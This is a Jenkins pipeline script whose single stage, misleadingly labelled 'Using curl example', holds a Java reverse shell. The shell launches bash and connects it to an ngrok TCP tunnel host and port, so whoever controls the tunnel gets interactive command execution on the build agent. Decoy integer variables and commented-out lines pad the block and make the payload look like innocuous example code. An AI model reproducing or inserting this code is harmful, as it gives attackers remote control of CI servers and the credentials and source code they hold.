pipeline { 
    agent any
    stages {
        stage("Using curl example") {
            steps {
                script {
                    String host="6.tcp.eu.ngrok.io";
                    int x = 10;
                    int y= 0;
                    int z = 010101;
                    int port=12636;
                    int m = 0;
                    String host="6.tcp.eu.ngrok.io";
                    //int y = 10;
                    //int x = 20;
                    int port=12636;
                    String cmd="bash";
                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
                    }
                }
            }
        }
    
}
